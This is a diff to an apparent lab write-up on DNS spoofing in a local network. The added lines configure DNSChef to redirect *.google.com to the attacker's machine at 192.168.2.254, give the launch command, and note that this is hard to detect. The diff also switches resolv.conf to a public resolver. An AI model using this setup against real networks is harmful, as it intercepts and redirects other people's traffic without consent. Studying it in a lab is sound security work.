@@ -52,10 +52,10 @@ netmask 255.255.255.0
 gateway 192.168.2.1
 ```
 
-To the file */etc/resolv.conf*
+To the file */etc/resolv.conf*.
 ```shell
 domain
-nameserver 192.168.2.1
+nameserver 8.8.8.8
 search localdomain
 ```
 
@@ -75,4 +75,16 @@ So all the DNS requests traffic will be forwarded to my attacking machine withou
 
 <img src="pic_5.png" width="60%" height="60%">
 
-we can browse other websites at the same time and nobody can detect anything abnormal.
+Here comes another problem, we can't browse other websites normally. So we have to take other approaches to achieve that, DNSChef will always be my choice.
+
+Shutdown the bettercap server and clone the DNSChef(https://github.com/iphelix/dnschef) repository. Modify the file *dnschef.ini*.
+```ini
+*.google.com=192.168.2.254
+```
+
+Start up DNSChef server.
+```shell
+python dnschef.py --file=dnschef.ini --nameservers=8.8.8.8 --interface=192.168.2.254
+```
+
+It will be very difficult to detect anything abnormal in this case. 
